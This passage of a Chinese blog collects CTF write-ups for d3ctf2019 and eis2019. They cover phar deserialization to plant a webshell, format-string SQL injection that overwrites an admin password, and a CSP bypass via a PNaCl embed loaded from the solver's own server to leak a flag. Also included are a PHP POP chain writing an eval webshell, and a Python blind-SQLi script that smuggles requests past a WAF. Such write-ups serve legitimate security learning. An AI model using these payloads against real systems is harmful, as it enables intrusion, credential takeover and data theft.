        $content = file_get_contents($this-&gt;url,NULL,NULL,0,2048);
        if (preg_match(&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;, $content)){
            die(&#39;hacker!!!&#39;);
        }
        file_put_contents($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename,$content);
    }
    public function remove(){
        $this-&gt;checkdir();
        $this-&gt;checkext();
        if (file_exists($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename)){
            unlink($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename);
        }
    }
    public function count($dir) {
        if ($dir === &#39;&#39;){
            $num = count(scandir($this-&gt;userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num &gt; 0) {
            return &quot;you have $num files&quot;;
        }
        else{
            return &quot;you don&#39;t have file&quot;;
        }
    }
    public function __toString() {
        return implode(&quot; &quot;,scandir(__DIR__.&quot;/&quot;.$this-&gt;userdir));
    }
    public function __destruct() {
        $string = &quot;your file in : &quot;.$this-&gt;userdir;
        file_put_contents($this-&gt;filename.&quot;.txt&quot;, $string);
        echo $string;
    }
}

if (!isset($_POST[&#39;action&#39;]) || !isset($_POST[&#39;url&#39;]) || !isset($_POST[&#39;filename&#39;])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST[&#39;url&#39;],$_POST[&#39;filename&#39;]);
if($_POST[&#39;action&#39;] === &quot;upload&quot;) {
    $dir-&gt;upload();
}
elseif ($_POST[&#39;action&#39;] === &quot;remove&quot;) {
    $dir-&gt;remove();
}
elseif ($_POST[&#39;action&#39;] === &quot;count&quot;) {
    if (!isset($_POST[&#39;dir&#39;])){
        echo $dir-&gt;count(&#39;&#39;);
    } else {
        echo $dir-&gt;count($_POST[&#39;dir&#39;]);
    }
}</code></pre>
<blockquote>
<p>webroot in /var/www/html<br>Notice:scanner is useless<br>hint1: webroot changes every 10 mins<br>hint2: glob<br>hint3: <a href="https://www.php.net/manual/en/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/en/language.oop5.decon.php</a>  ** Pay attention to the notes in the article **</p>
</blockquote>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>upload处url可控,所以只要上传一个phar文件便可以反序列化</p>
<p>利用这个能做到:</p>
<ol>
<li>扫目录<code>__destruct__=&gt;__toString__</code></li>
<li>任意位置写文件,但是因为上传phar文件时有过滤,所以文件内容也有所限制</li>
</ol>
<p>但是</p>
<p><code>phar://phar.phar.gz/test.txt</code></p>
<p><code>将phar文件压缩后便可以绕过文件限制</code></p>
<p>于是我们就可以在任意位置写文件的权限了</p>
<p>于是我们有这样的思路:利用upload写一个htaccess,然后再利用反序列化写一个shell。</p>
<p>这里有个坑点就是，web主目录每隔10分钟变化一次,但是我们仍然可以利用反序列化来读取web目录</p>
<p>按照上述步骤成功拿到shell</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmy4tnlxj30ja05mglr.jpg" alt="image.png"></p>
<p>输入phpinfo()发现,有disable_function里禁用了system等函数,这就不爽了。但是php版本是7.2，上传</p>
<p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a>  这个老兄写的绕过disable_function的脚本，爽死了。</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmyvlo98j30ga03ywej.jpg" alt="image.png"></p>
<h3 id="showhub"><a href="#showhub" class="headerlink" title="showhub"></a>showhub</h3><p>阅读代码发现</p>
<pre><code class="php">public function register($username, $password)
    {
        $password = hash(&quot;sha256&quot;, $password);
        $user = (new User(null, $username, $password))-&gt;save();
        if ($user) {
            $_SESSION[&#39;uid&#39;] = $user-&gt;id;
            return $user;
        }
        return false;
    }

public function save()
    {
        $args = get_object_vars($this);
        $args = array_slice($args, 0, -2);
        if ($args[&#39;id&#39;] !== null) {
            $baseSql = &quot;UPDATE `$this-&gt;tbname` SET %s WHERE id=&quot; . $args[&#39;id&#39;];
            $sql = self::prepareUpdate($baseSql, array_slice($args, 1));
            $this-&gt;db-&gt;query($sql);
            if (!$this-&gt;db-&gt;conn-&gt;error) {
                return $this;
            } else {
                return null;
            }

        } else {

            $baseSql = &quot;INSERT INTO `$this-&gt;tbname`(%s) VALUE(%s)&quot;;
            $sql = self::prepareInsert($baseSql, $args);
            $this-&gt;db-&gt;query($sql);
            if (!$this-&gt;db-&gt;conn-&gt;error) {
                $objectID = $this-&gt;db-&gt;query(&quot;SELECT LAST_INSERT_ID()&quot;)-&gt;fetch_row()[0];
                return self::findOne(array(&quot;id&quot; =&gt; $objectID));
            } else {
                return null;
            }
        }

    }</code></pre>
<p>register调用的save方法存在格式化字符串漏洞可以绕过addslashes</p>
<p>构造<code>user=admin%1$&#39;,0x60)#&amp;pass=123</code></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9l4a1jb20j30l204cgls.jpg" alt="image.png"></p>
<p>insert 的一个方法可以修改重复的值  <code>insert on duplicate key update</code> ，它能够让我们在新插入的一个数据和原有数据发生重复时，修改原有数据。那么我们通过这个技巧修改管理员的密码即可。 </p>
<p>测试test用户,原密码:123</p>
<p>构造<code>user=test%1$&#39;,0x60)on duplicate key update password=0x38643936396565663665636164336332396133613632393238306536383663663063336635643561383661666633636131323032306339323361646336633932#&amp;pass=123</code></p>
<p>成功将密码修改为123456，冲admin密码</p>
<p>接着进入webconsole当中,提示只有内网才能使用</p>
<p>相关代码</p>
<pre><code class="php">if ($this-&gt;request-&gt;user-&gt;username === &quot;admin&quot; &amp;&amp; !filter_var(
                $_SERVER[&#39;HTTP_CLIENT_IP&#39;],
                FILTER_VALIDATE_IP,
                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
            ))</code></pre>
<p>emmm直接修改cilent-ip发现不行</p>
<blockquote>
<p>因为这里的<code>Client-IP</code>头是反代层面设置的（set $Client-IP $remote_addr）, 所以无法通过前端修改请求头来伪造。 </p>
<p>这时可以从服务器返回的<code>Server</code>头中发现，反代是<code>ATS7.1.2</code> 那么应该很敏感的想到通过<code>HTTP走私</code> 来绕过反代，规避反代设置<code>Client-IP</code>。 </p>
</blockquote>
<p>那么什么是ast?</p>
<blockquote>
<p>Apache Traffic Server™ is a high-performance web proxy cache that improves network efficiency and performance by caching frequently-accessed information at the edge of the network. This brings content physically closer to end users, while enabling faster delivery and reduced bandwidth use. Traffic Server is designed to improve content delivery for enterprises, Internet service providers (ISPs), backbone providers, and large intranets by maximizing existing and available bandwidth. </p>
</blockquote>
<p>emmmm,ast是一个在用户和服务器之间的起缓冲加速的代理服务器,这也正是http走私常出现的应用场景</p>
<p><code>ATS7.1.2</code> 有个cve恰好是关于http走私的，直接用就ok了</p>
<h3 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h3><p>emmm,ctf的弥天大谎</p>
<pre><code class="python">from flask import Flask, render_template_string, session, request, make_response
import hashlib
import os
import json
from rq import Queue
from redis import Redis

app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = &#39;somesecret&#39;
config = json.load(open(&#39;config.json&#39;, &#39;r&#39;))


def verify_url(url):
    base = &#39;https://&#39;+request.host
    if len(url) == 0:
        return False
    if len(url) &lt; len(base) or url[:len(base)] != base:
        return False
    return True


def verify_captcha(captcha):
    return &#39;captcha&#39; in session.keys() \
        and len(session.get(&#39;captcha&#39;)) == 5 \
        and hashlib.md5(captcha.encode()).hexdigest()[:5] == session.get(&#39;captcha&#39;)


def add_queue(url):
    q = Queue(connection=Redis(
        host=config[&#39;redis&#39;][&#39;host&#39;],
        password=config[&#39;redis&#39;][&#39;auth&#39;]
    ))
    q.enqueue(&#39;bot.add&#39;, url)


@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
@app.route(&#39;/index.php&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def index():
    message = &quot;&quot;
    if request.method == &#39;POST&#39;:
        try:
            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():
                captcha = request.form[&#39;captcha&#39;]
                url = request.form[&#39;url&#39;]
                if not verify_captcha(captcha):
                    message = &quot;Wrong Captcha :(&quot;
                elif not verify_url(url):
                    message = &quot;Wrong URL :(&quot;
                else:
                    session.pop(&#39;captcha&#39;)
                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;
                    add_queue(url)
        except:
            message = &quot;Error! Please contact admin&quot;
    if &#39;captcha&#39; not in request.form.keys() or &#39;captcha&#39; not in session.keys():
        session[&#39;captcha&#39;] = hashlib.md5(os.urandom(16)).hexdigest()[:5]
    return render_template_string(
        index,
        message=message,
        host=&#39;https://&#39;+request.host,
        captcha=session[&#39;captcha&#39;]
    )


@app.route(&#39;/fd.php&#39;)
def mirror():
    response = make_response(request.args.get(&#39;q&#39;))
    response.headers[&#39;Content-Security-Policy&#39;] = &quot;img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;&quot;
    return response


@app.route(&#39;/admin.php&#39;)
def admin():
    if request.headers.get(&#39;x-forwarded-for&#39;) != config[&#39;redis&#39;][&#39;host&#39;]:
        return &#39;only admin can see it&#39;
    token = request.host.split(&#39;.&#39;)[0]
    return f&#39;&#39;&#39;{{
    "token": "{token}",
    "flag": "d3ctf{{{hashlib.sha256((
        token+config["challenge"]["flag"]
    ).encode()).hexdigest()}}}&quot;
}}
&#39;&#39;&#39;</code></pre>
<p>关键代码:</p>
<pre><code class="python">if request.method == &#39;POST&#39;:
        try:
            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():
                captcha = request.form[&#39;captcha&#39;]
                url = request.form[&#39;url&#39;]
                if not verify_captcha(captcha):
                    message = &quot;Wrong Captcha :(&quot;
                elif not verify_url(url):
                    message = &quot;Wrong URL :(&quot;
                else:
                    session.pop(&#39;captcha&#39;)
                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;
                    add_queue(url)
        except:
            message = &quot;Error! Please contact admin&quot;</code></pre>
<pre><code class="python">
def verify_url(url):
    base = &#39;https://&#39;+request.host
    if len(url) == 0:
        return False
    if len(url) &lt; len(base) or url[:len(base)] != base:
        return False
    return True
</code></pre>
<p>通过verify_url之后,admin便回访问.这里用<code>&#39;https://&#39;+request.host</code>来验证是否来源于原网站</p>
<p>emmm,request.host=<code>/fd.php</code>,就不用考虑修改host来绕过拉</p>
<p>那么就是要绕<code>/fd.php</code>的csp策略了:<code>img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;</code></p>
<p>真的是baby难度啊。。。。。</p>
<blockquote>
<p>丢到csp-evaluator里头可以发现没有设置object-src<br>object-src允许嵌入object<br>根据hint去<code>chrome://components</code>里头找有什么可以利用的组件<br>最新版chrome已经默认禁止了flash的使用(然而就是有很多人不信邪)<br>通过一些搜索可以发现pNaCl可以跑C/C++</p>
<p>可以编写一个Leak去请求admin.php，获取flag，然后再将flag带出来<br>下载下来谷歌的<a href="https://developers.google.com/native-client/dev/sdk/download" target="_blank" rel="noopener">SDK</a>和Leak后可以编译出一个nmf文件和一个pexe文件，放到自己的服务器上然后尝试:</p>
<pre><code class="html">&lt;embed src=&quot;http://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre>
<p>轻松获得了一个Mixed Content呢（（毒瘤出题人<br>上https以后发现:</p>
<pre><code>PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled</code></pre><p>搜索Origin Trial，看新闻：</p>
<p><a href="https://developer.chrome.com/native-client/migration" target="_blank" rel="noopener">https://developer.chrome.com/native-client/migration</a><br><a href="https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md" target="_blank" rel="noopener">https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md</a></p>
<p>去<a href="https://developers.chrome.com/origintrials" target="_blank" rel="noopener">Origin Trial</a>申请一个token，最终的payload:</p>
<pre><code>&lt;meta http-equiv=&quot;origin-trial&quot; content=&quot;[token]&quot;&gt;
&lt;embed src=&quot;https://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre></blockquote>
<h3 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h3><p>自己搭的环境毛病一大堆///就直接看别人wp了</p>
<p>题目是一个在线留言板，注册登录后可以提交留言。</p>
<p>简单测试后会发现留言可以插入 HTML 标签，但是后端使用了标签名/属性名白名单做过滤，一般的危险标签和属性都被 ban 掉了。</p>
<p>控制台可以看到打包前的前端源码，审计一波。</p>
<p>第一个问题，CSRF token 是直接使用的 sessionid :</p>
<p><a href="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" alt="img"></a></p>
<p>因此如果我们能获得他人的 token 就可以登录他人账号。</p>
<p>第二个问题，我们传入的参数 this.$route.query.did 被拼接到了 jsonp 方法的 url 当中</p>
<p><a href="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" alt="img"></a></p>
<p>因此我们可以设置 did 为 <code>1/delete?callback=alert#</code> ，控制 jsonp 的 callback ，在 jsonp 方法中会直接执行：</p>
<p><a href="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" alt="img"></a></p>
<p>但是后端的 jsonp api 给 callback 做了校验，只能传入有限的字符，并不能任意执行 js 代码。</p>
<p><a href="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" alt="img"></a></p>
<p>所以我们需要把这两个问题结合利用一下，利用这个受限的 jsonp xss 来劫持 token 。</p>
<p><a href="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" alt="img"></a></p>
<p>我们可以看到 token 被渲染到了 id 为 messageForm 的 form 中，所以我们可以尝试劫持这个 form ，让他的 submit 后提交到我们的服务器，从而获取 token 。</p>
<p>如何劫持呢？利用两个 HTML5 的有趣属性：</p>
<blockquote>
<p><a href="https://www.w3school.com.cn/tags/att_input_formaction.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_formaction.asp</a></p>
<p><a href="https://www.w3school.com.cn/tags/att_input_form.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_form.asp</a></p>
</blockquote>
<p>我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单：</p>
<p><a href="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" alt="img"></a></p>
<p>利用 jsonp xss 来点击它：</p>
<pre><code>http://localhost:8180/#/?pid=72&amp;did=23%2Fdelete%3Fcallback%3Dfish.click%23</code></pre><p>token 就到手了：</p>
<p><a href="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" alt="img"></a></p>
<p>report 这条 payload ，获得 admin 的 token 之后登录 admin 账号，在 admin 的留言中获得 flag 。</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="c-c"><a href="#c-c" class="headerlink" title="c+c"></a>c+c</h3><p>readme.txt</p>
<blockquote>
<p>This is a lite (which means there is no voice but the script is complete.) version of a great galgame (a.k.a. Visual Novel) written by Romeo Tanaka. Hope you enjoy it.<br>PS: I did some small hack to the game for cracking. But you still need steam running to play this game.<br>PSS: If you like it, you can buy it on steam.<br>PSSS: Do not forget to find the flag. And the flag is just in THIS file.</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976rzdu69j30j001aglt.jpg" alt="image.png"></p>
<p>游戏中会出现</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976tjarq4j308k01nt8n.jpg" alt="image.png"></p>
<p>一些不可见字符8个以上,可能是flag?</p>
<pre><code class="lua">function L0_0()
  local L0_32, L1_33, L2_34, L3_35
  L0_32 = {
    L1_33,
    L2_34,
    L3_35,
    172,
    21,
    149,
    198,
    139,
    38,
    63,
    174,
    238,
    232,
    20,
    85,
    107
  }
  L1_33 = 221
  L2_34 = 179
  L3_35 = 102
  L1_33 = 166
  L2_34 = 44
  L3_35 = &quot;{&quot;
  for _FORV_7_ = 1, #L0_32 do
    L3_35 = L3_35 .. string.format(&quot;%02x&quot;, L0_32[_FORV_7_] ~ L1_33)
    if _FORV_7_ == 4 or _FORV_7_ == 6 or _FORV_7_ == 8 or _FORV_7_ == 10 then
      L3_35 = L3_35 .. &quot;-&quot;
    end
  end
  L3_35 = L3_35 .. &quot;}&quot;
  return &quot;&quot;, &quot;&quot;, string.upper(L3_35), L2_34

end</code></pre>
<p>su直接去买了原版游戏，对比发现只有dll，exe文件不同</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97whcjur2j31ya0poq7p.jpg" alt="image.png"></p>
<p>阵亡</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/d3ctf2019/">http://blog.ccreater.top/2020/04/20/d3ctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/d3ctf2019/" data-id="cka3ckr2k001mv4v0f4sbd88d" data-title="d3ctf" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-eis2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/eis2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:49:59.977Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/eis2019/">eis2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="eis2019"><a href="#eis2019" class="headerlink" title="eis2019"></a>eis2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>upload:</p>
<p>校验文件头</p>
<p>过滤后缀php</p>
<p>上传php5后缀绕过</p>
<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<pre><code class="php">&lt;?php
error_reporting(0);

class A{

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = &#39;flysystem&#39;, $expire = null)
    {
        $this-&gt;key    = $key;
        $this-&gt;store  = $store;
        $this-&gt;expire = $expire;
    }

    public function cleanContents(array $contents)
    {
        $cachedProperties = array_flip([
            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,
            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,
        ]);

        foreach ($contents as $path =&gt; $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage()
    {
        $cleaned = $this-&gt;cleanContents($this-&gt;cache);

        return json_encode([$cleaned, $this-&gt;complete]);
    }

    public function save()
    {
        $contents = $this-&gt;getForStorage();

        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);
    }

    public function __destruct()
    {
        if (! $this-&gt;autosave) {
            $this-&gt;save();
        }
    }
}

class B{

    protected function getExpireTime($expire): int
    {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string
    {
        return $this-&gt;options[&#39;prefix&#39;] . $name;
    }

    protected function serialize($data): string
    {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this-&gt;options[&#39;serialize&#39;];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool
    {
        $this-&gt;writeTimes++;

        if (is_null($expire)) {
            $expire = $this-&gt;options[&#39;expire&#39;];
        }

        $expire   = $this-&gt;getExpireTime($expire);
        $filename = $this-&gt;getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this-&gt;serialize($value);

        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET[&#39;src&#39;]))
{
    highlight_file(__FILE__);
}

$dir = &quot;uploads/&quot;;

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET[&quot;data&quot;]);</code></pre>
<p>这里有一个上传点</p>
<pre><code class="php">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
$result = file_put_contents($filename, $data);</code></pre>
<p>但是这里有个死亡exit</p>
<p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<p>这里文件名可控,我们用php协议编码exit从而绕过死亡exit</p>
<p>构造</p>
<pre><code class="php">&lt;?php

class A{

    protected $store;

    protected $key;

    protected $expire;
    public $autosave=FALSE;
    public $complete;
    public $cache;

    public function __construct()
    {
        $this-&gt;key    = &quot;fffffuck.php&quot;;
        $this-&gt;store=new B;
        $this-&gt;expire = $expire;
        $this-&gt;complete=&quot;PD9waHAgZXZhbCgkX1BPU1RbImEiXSk7ID8+&quot;;
        $this-&gt;cache=array();
    }

}

class B{

    public $options;
    public $writeTimes;
    public function __construct()
    {
        $this-&gt;options=array(
            &#39;expire&#39;=&gt;&#39;0&#39;,
            &quot;prefix&quot;=&gt;&#39;php://filter/write=convert.base64-decode/resource=uploads/&#39;,
            &#39;serialize&#39;=&gt;&#39;serialize&#39;,
            &#39;data_compress&#39;=&gt;FALSE
        );

    }


}
print(urlencode(serialize(new A)));
?&gt;</code></pre>
<h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a> </p>
<p>利用这个绕过</p>
<h3 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h3><pre><code class="php">&lt;?php
include &quot;config.php&quot;;

if (isset($_GET[&#39;src&#39;]))
{
    highlight_file(__FILE__);
}

function escape($arr)
{
    global $mysqli;
    $newarr = array();
    foreach($arr as $key=&gt;$val)
    {
        if (!is_array($val))
        {
            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);
        }
    }
    return $newarr;
}

$_GET= escape($_GET);

if (isset($_GET[&#39;name&#39;]))
{
    $name = $_GET[&#39;name&#39;];
    mysqli_query($mysqli, &quot;select age from user where name=&#39;$name&#39;&quot;);
}else if(isset($_GET[&#39;age&#39;]))
{
    $age = $_GET[&#39;age&#39;];
    mysqli_query($mysqli, &quot;select name from user where age=$age&quot;);
}

</code></pre>
<p>选择age作为注入点，不需要逃逸引号,没有回显利用时间盲注</p>
<p><code>?age=1%2bsleep(1)</code> =&gt; 403</p>
<p>apache设置了waf</p>
<p>用畸形的http绕过waf</p>
<pre><code class="python">import requests
import hackhttp 
import urllib
import socket

ip = &#39;111.186.57.61&#39;
port = 10601

def send_raw(raw):

    try:
        with socket.create_connection((ip, port), timeout=2) as conn:
            conn.send(bytes(raw,encoding=&quot;ascii&quot;))
            res = conn.recv(10240).decode()

    except:
        return True

    return False



def rawhttp(sql):
    sql=urllib.parse.quote(sql)
    burp0_url = &quot;http://111.186.57.61:10601/?age={}&quot;.format(sql)
    raw=&#39;&#39;&#39;GET /?age={} HTTP/1.1
Host: 111.186.57.61:10601
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 0
Content-Length: 0

&#39;&#39;&#39;.format(sql).replace(&quot;\n&quot;,&quot;\r\n&quot;)
    return send_raw(raw)


l=&#39;0123456789ABCDEF&#39;
result=&quot;657A73716C69&quot;#database :ezsqli

result=&quot;&quot;#table flag_xdd,user?
#column flag_32122
#flag{bypass_modsecurity_a202e614489c}
j=len(result)
while True:
    for i in l:
        sql=&quot;if((select substr(hex(GROUP_CONCAT(flag_32122)),{},1) FROM flag_xdd)=char({}),sleep(10),0)&quot;.format(j+1,ord(i))
        if rawhttp(sql):
            result+=i
            print(result)
            break
        else :
            print(&quot;第{}个字符不是{}&quot;.format(j+1,i))
    j+=1


</code></pre>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>莫得</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="two-cat"><a href="#two-cat" class="headerlink" title="two_cat"></a>two_cat</h3><p>看别人的wp知道是盲水印攻击</p>
